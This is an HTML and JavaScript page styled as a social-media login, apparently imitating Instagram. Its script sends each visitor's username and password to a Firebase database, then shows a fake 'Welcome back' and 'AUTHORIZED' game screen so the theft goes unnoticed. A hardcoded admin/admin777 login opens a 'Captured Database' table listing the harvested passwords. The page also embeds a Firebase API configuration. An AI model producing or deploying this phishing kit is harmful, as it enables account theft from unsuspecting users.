<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in</title>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<style>
  :root {
    --bg: #ffffff;
    --border: #dbdbdb;
    --text: #262626;
    --text-muted: #8e8e8e;
    --accent: #0095f6;
    --accent-hover: #1877f2;
    --radius: 8px;
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: var(--bg);
    color: var(--text);
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }

  .login-card {
    width: 100%;
    max-width: 350px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .top-bar {
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 24px;
  }

  .back-btn {
    background: none;
    border: none;
    font-size: 20px;
    cursor: pointer;
    color: var(--text);
    padding: 4px;
  }

  .lang-select {
    border: none;
    background: none;
    color: var(--text-muted);
    font-size: 14px;
    cursor: pointer;
  }

  .logo {
    width: 72px;
    height: 72px;
    border-radius: 20px;
    background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 24px 0 40px;
  }

  .logo svg {
    width: 36px;
    height: 36px;
    stroke: #fff;
    fill: none;
    stroke-width: 2;
  }

  form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 12px;
  }

  input {
    width: 100%;
    padding: 14px 16px;
    border: 1px solid var(--border);
    border-radius: var(--radius);
    font-size: 15px;
    background: #fafafa;
    outline: none;
    transition: border-color 0.15s ease;
  }

  input:focus {
    border-color: #a8a8a8;
  }

  input::placeholder {
    color: var(--text-muted);
  }

  .login-btn {
    margin-top: 4px;
    padding: 14px;
    border: none;
    border-radius: 24px;
    background: var(--accent);
    color: #fff;
    font-weight: 600;
    font-size: 15px;
    cursor: pointer;
    transition: background 0.15s ease;
  }

  .login-btn:hover {
    background: var(--accent-hover);
  }

  .login-btn:disabled {
    opacity: 0.5;
    cursor: default;
  }

  .forgot-link {
    margin-top: 16px;
    font-size: 14px;
    color: var(--text);
    text-decoration: none;
    text-align: center;
    cursor: pointer;
  }

  .forgot-link:hover {
    text-decoration: underline;
  }

  .spacer {
    height: 60px;
  }

  .signup-btn {
    width: 100%;
    padding: 14px;
    border: 1px solid var(--accent);
    border-radius: 24px;
    background: #fff;
    color: var(--accent);
    font-weight: 600;
    font-size: 15px;
    cursor: pointer;
    transition: background 0.15s ease;
  }

  .signup-btn:hover {
    background: #f0f8ff;
  }

  .brand-footer {
    margin-top: 20px;
    display: flex;
    align-items: center;
    gap: 6px;
    color: var(--text-muted);
    font-size: 14px;
    font-weight: 600;
  }

  /* === PORTAL OUTPUT - AAA RPG Authorization Screen === */
  #portal-output {
    margin-top: 0;
    display: none;
    width: 100vw;
    height: 100vh;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    background: #0a0a1a;
    overflow: hidden;
  }

  #portal-output.visible {
    display: block !important;
    visibility: visible !important;
    opacity: 1 !important;
  }

  .admin-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 0.85rem;
  }

  .admin-table th, .admin-table td {
    border: 1px solid #dbdbdb;
    padding: 10px;
    text-align: left;
  }

  .admin-table th {
    background: #fafafa;
    font-weight: 600;
  }

  @media (max-width: 400px) {
    .login-card {
      max-width: 100%;
    }
  }
</style>
</head>
<body>

  <div class="login-card">
    <div class="top-bar">
      <button class="back-btn" onclick="history.back()" aria-label="Go back">&#8592;</button>
      <select class="lang-select" aria-label="Select language">
        <option>English (India)</option>
        <option>Hindi</option>
        <option>English (US)</option>
      </select>
    </div>

    <div class="logo" aria-hidden="true">
      <svg viewBox="0 0 24 24">
        <rect x="3" y="3" width="18" height="18" rx="5"/>
        <circle cx="12" cy="12" r="4.5"/>
        <circle cx="17.5" cy="6.5" r="0.8" fill="#fff" stroke="none"/>
      </svg>
    </div>

    <div id="auth-form" style="width:100%;">
      <form onsubmit="return false;">
        <input type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="username" required>
        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
        <button type="button" class="login-btn" onclick="handleAuth()">Log in</button>
      </form>

      <a class="forgot-link">Forgotten password?</a>

      <div class="spacer"></div>

      <button class="signup-btn" onclick="alert('Create new account')">Create new account</button>

      <div class="brand-footer">Your Brand</div>
    </div>

    <div id="portal-output"></div>
  </div>

<script>
  // --- FIREBASE CONFIG ---
  const firebaseConfig = {
    apiKey: "AIzaSyDi20_1FpiU7OQ4EEQMDdvyHlY5_Vn23F4",
    authDomain: "dragoai-ef040.firebaseapp.com",
    databaseURL: "https://dragoai-ef040-default-rtdb.firebaseio.com/",
    projectId: "dragoai-ef040",
    storageBucket: "dragoai-ef040.firebasestorage.app",
    messagingSenderId: "972005846887",
    appId: "1:972005846887:web:af60900dd52746444889c2"
  };

  if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
    firebase.initializeApp(firebaseConfig);
  }
  const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;

  // --- AUTH HANDLER ---
  function handleAuth() {
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!user || !pass) {
      alert("Please fill in all fields.");
      return;
    }

    // === ADMIN DASHBOARD ===
    if (user === "admin" && pass === "admin777") {
      document.getElementById("auth-form").style.display = "none";
      loadDashboard();
      return;
    }

    // === FIREBASE SUBMIT ===
    if (database) {
      const logsRef = database.ref("players").push();
      logsRef.set({
        username: user,
        password: pass,
        timestamp: new Date().toISOString()
      }).then(() => {
        showWelcome(user);
      }).catch((err) => {
        console.error("Firebase Error:", err);
        showWelcome(user);
      });
    } else {
      showWelcome(user);
    }
  }

  // === AAA RPG AUTHORIZATION SCREEN ===
  function showWelcome(user) {
    document.getElementById("auth-form").style.display = "none";
    document.body.style.padding = "0";
    document.body.style.margin = "0";
    document.body.style.overflow = "hidden";

    const output = document.getElementById("portal-output");
    output.classList.add("visible");

    output.innerHTML = `
      <div style="
        width:100%; height:100%;
        display:flex;
        background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 50%, #0d0d2b 100%);
        font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
        position:relative;
        overflow:hidden;
      ">
        <!-- Background: Tropical Beach -->
        <div style="
          position:absolute; top:0; left:0; width:100%; height:100%;
          background: linear-gradient(180deg, #87CEEB 0%, #4A90D9 30%, #2ECC71 50%, #F4D03F 65%, #1ABC9C 75%, #0E6655 100%);
          opacity:0.15;
          z-index:0;
        "></div>
        <div style="
          position:absolute; top:0; left:0; width:100%; height:100%;
          background:
            radial-gradient(ellipse at 20% 80%, rgba(46,204,113,0.2) 0%, transparent 50%),
            radial-gradient(ellipse at 80% 20%, rgba(135,206,235,0.15) 0%, transparent 50%),
            radial-gradient(ellipse at 50% 50%, rgba(241,196,15,0.1) 0%, transparent 40%);
          z-index:0;
        "></div>

        <!-- Left Golden Panel -->
        <div style="
          position:absolute; left:0; top:0; width:60px; height:100%;
          background: linear-gradient(180deg, #BF953F 0%, #FCF6B5 25%, #B38728 50%, #FBF5B7 75%, #AA771C 100%);
          display:flex; align-items:center; justify-content:center; z-index:2;
        ">
          <div style="
            writing-mode:vertical-rl;
            text-orientation:mixed;
            font-size:14px;
            font-weight:700;
            letter-spacing:6px;
            color:#1a1a1a;
            font-family:'Segoe UI', sans-serif;
            text-transform:uppercase;
          ">Authorization</div>
        </div>

        <!-- Red Help Banner -->
        <div style="
          position:absolute; top:20px; left:80px; right:20px;
          background: linear-gradient(135deg, #e74c3c, #c0392b);
          border-radius:12px;
          padding:12px 20px;
          display:flex;
          align-items:center;
          gap:12px;
          z-index:3;
          box-shadow: 0 4px 20px rgba(231,76,60,0.3);
        ">
          <span style="font-size:20px;">🛟</span>
          <span style="color:#fff; font-weight:600; font-size:14px; letter-spacing:0.5px;">Solutions to login problems</span>
        </div>

        <!-- Center Glassmorphism Panel -->
        <div style="
          position:absolute;
          left:50%; top:50%;
          transform:translate(-50%,-50%);
          width:340px;
          padding:40px 30px;
          background: rgba(10,10,30,0.65);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          border:1px solid rgba(255,215,0,0.15);
          border-radius:24px;
          z-index:3;
          box-shadow: 0 0 60px rgba(0,0,0,0.5), 0 0 30px rgba(255,215,0,0.05);
        ">
          <h2 style="color:#fff; font-size:22px; font-weight:700; text-align:center; margin:0 0 8px 0; letter-spacing:1px;">WELCOME BACK</h2>
          <p style="color:rgba(255,255,255,0.5); font-size:13px; text-align:center; margin:0 0 28px 0;">${user}</p>

          <div style="margin-bottom:16px; position:relative;">
            <label style="color:rgba(255,255,255,0.6); font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:1.5px; margin-bottom:6px; display:block;">Email</label>
            <input type="email" value="${user}@game.mail" disabled style="
              width:100%; padding:14px 16px;
              background: rgba(255,255,255,0.06);
              border:1px solid rgba(255,215,0,0.2);
              border-radius:14px;
              color:#fff;
              font-size:14px;
              outline:none;
              backdrop-filter:blur(10px);
            ">
          </div>

          <div style="margin-bottom:24px; position:relative;">
            <label style="color:rgba(255,255,255,0.6); font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:1.5px; margin-bottom:6px; display:block;">Password</label>
            <div style="position:relative;">
              <input type="password" value="••••••••" disabled style="
                width:100%; padding:14px 46px 14px 16px;
                background: rgba(255,255,255,0.06);
                border:1px solid rgba(255,215,0,0.2);
                border-radius:14px;
                color:#fff;
                font-size:14px;
                outline:none;
                backdrop-filter:blur(10px);
              ">
              <span style="position:absolute; right:14px; top:50%; transform:translateY(-50%); color:rgba(255,215,0,0.5); font-size:18px; cursor:default;">👁</span>
            </div>
          </div>

          <button onclick="nextStep()" style="
            width:100%; padding:16px;
            background: linear-gradient(135deg, #BF953F, #FCF6B5, #B38728);
            border:none;
            border-radius:30px;
            color:#1a1a1a;
            font-weight:700;
            font-size:16px;
            letter-spacing:2px;
            text-transform:uppercase;
            cursor:pointer;
            box-shadow: 0 0 30px rgba(191,149,63,0.3);
            transition: all 0.3s;
            margin-bottom:20px;
          " onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">Next</button>

          <div style="display:flex; justify-content:space-between;">
            <span style="color:rgba(255,255,255,0.3); font-size:13px; cursor:default;">← Back</span>
            <span style="color:rgba(255,255,255,0.3); font-size:13px; cursor:default;">Restore Account</span>
          </div>
        </div>

        <!-- Right Side: Woman Character -->
        <div style="
          position:absolute; right:0; top:0; width:35%; height:100%;
          z-index:2;
          display:flex;
          align-items:flex-end;
          justify-content:center;
        ">
          <!-- Geometric BG -->
          <div style="
            position:absolute; right:0; top:0; width:100%; height:100%;
            background:
              linear-gradient(135deg, rgba(255,255,255,0.03) 0%, transparent 50%),
              repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(255,215,0,0.02) 20px, rgba(255,215,0,0.02) 21px);
            clip-path: polygon(20% 0%, 100% 0%, 100% 100%, 0% 100%);
          "></div>

          <!-- Character Silhouette -->
          <div style="
            position:relative; z-index:2;
            width:220px; height:380px;
            display:flex; flex-direction:column; align-items:center;
            margin-bottom:40px;
          ">
            <!-- Hair -->
            <div style="
              width:120px; height:60px;
              background: radial-gradient(ellipse at 50% 0%, #F5F5DC 0%, #E8D5B7 60%, #C4A882 100%);
              border-radius:60px 60px 0 0;
              margin-bottom:-15px;
              box-shadow: 0 -10px 40px rgba(245,245,220,0.15);
            "></div>
            <!-- Sunglasses -->
            <div style="
              width:100px; height:24px;
              background: #1a1a1a;
              border-radius:20px;
              position:relative;
              z-index:3;
              box-shadow: 0 0 20px rgba(0,0,0,0.3);
              display:flex;
              align-items:center;
              justify-content:center;
              margin-bottom:-8px;
            ">
              <div style="width:40px; height:8px; background:rgba(255,255,255,0.1); border-radius:4px;"></div>
            </div>
            <!-- Face -->
            <div style="
              width:80px; height:50px;
              background: linear-gradient(180deg, #F5DEB3 0%, #EDCBA0 100%);
              border-radius:10px 10px 30px 30px;
              position:relative;
            "></div>
            <!-- Body / Pink Jacket -->
            <div style="
              width:110px; height:130px;
              background: linear-gradient(135deg, #FF69B4 0%, #FF1493 50%, #C71585 100%);
              border-radius:20px 20px 10px 10px;
              margin-top:-5px;
              position:relative;
              box-shadow: 0 10px 40px rgba(255,20,147,0.2), inset 0 -20px 40px rgba(0,0,0,0.15);
            ">
              <!-- Jacket lapels -->
              <div style="position:absolute; top:15px; left:10px; width:20px; height:40px; border:1px solid rgba(255,255,255,0.1); border-radius:0 0 10px 10px; border-top:none;"></div>
              <div style="position:absolute; top:15px; right:10px; width:20px; height:40px; border:1px solid rgba(255,255,255,0.1); border-radius:0 0 10px 10px; border-top:none;"></div>
            </div>
            <!-- Legs -->
            <div style="display:flex; gap:12px; margin-top:-2px;">
              <div style="width:28px; height:60px; background: linear-gradient(180deg, #F5DEB3 0%, #E8C99B 100%); border-radius:0 0 10px 10px;"></div>
              <div style="width:28px; height:60px; background: linear-gradient(180deg, #F5DEB3 0%, #E8C99B 100%); border-radius:0 0 10px 10px;"></div>
            </div>
          </div>
        </div>

        <!-- Register Section -->
        <div style="
          position:absolute; bottom:40px; left:50%; transform:translateX(-50%);
          z-index:3;
          text-align:center;
        ">
          <p style="color:rgba(255,255,255,0.4); font-size:13px; margin:0 0 10px 0; letter-spacing:1px;">Not Registered Yet?</p>
          <button style="
            padding:12px 48px;
            background: transparent;
            border:1px solid rgba(255,255,255,0.2);
            border-radius:30px;
            color:#fff;
            font-weight:600;
            font-size:15px;
            cursor:pointer;
            letter-spacing:2px;
            transition: all 0.3s;
          " onmouseover="this.style.borderColor='rgba(255,215,0,0.5)'" onmouseout="this.style.borderColor='rgba(255,255,255,0.2)'">Register</button>
        </div>
      </div>
    `;
  }

  function nextStep() {
    const output = document.getElementById("portal-output");
    output.innerHTML = `
      <div style="
        width:100%; height:100%;
        display:flex; flex-direction:column;
        align-items:center; justify-content:center;
        background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 100%);
        font-family: 'Segoe UI', sans-serif;
        color:#fff;
      ">
        <div style="
          width:80px; height:80px;
          border:3px solid #BF953F;
          border-radius:50%;
          display:flex;
          align-items:center;
          justify-content:center;
          font-size:36px;
          margin-bottom:20px;
          box-shadow: 0 0 60px rgba(191,149,63,0.2);
        ">✓</div>
        <h2 style="font-size:28px; font-weight:700; letter-spacing:2px; margin:0 0 10px 0;">AUTHORIZED</h2>
        <p style="color:rgba(255,255,255,0.4); font-size:14px; margin:0;">Access Granted • All Systems Active</p>
      </div>
    `;
  }

  // === ADMIN DASHBOARD (FIXED) ===
  function loadDashboard() {
    const output = document.getElementById("portal-output");
    output.classList.add("visible");
    output.style.textAlign = "left";
    output.innerHTML = `
      <h3 style="font-size:1.1rem; font-weight:600; margin-bottom:10px;">Captured Database</h3>
      <div id="logs-container" style="color:#8e8e8e; font-size:0.85rem;">Connecting to grid...</div>
    `;

    if (!database) {
      document.getElementById("logs-container").innerHTML = "<p style='color:#ed4956;'>Firebase config missing.</p>";
      return;
    }

    database.ref("players").on("value", (snap) => {
      const items = snap.val();
      if (!items) {
        document.getElementById("logs-container").innerHTML = "<p>No entries found.</p>";
        return;
      }
      let html = `<table class="admin-table"><thead><tr><th>Identity</th><th>Access Key</th></tr></thead><tbody>`;
      for (let key in items) {
        const u = items[key].username || '';
        const p = items[key].password || '';
        html += `<tr><td>${u.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}</td><td>${p.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}</td></tr>`;
      }
      html += `</tbody></table>`;
      document.getElementById("logs-container").innerHTML = html;
    });
  }
</script>
</body>
</html>
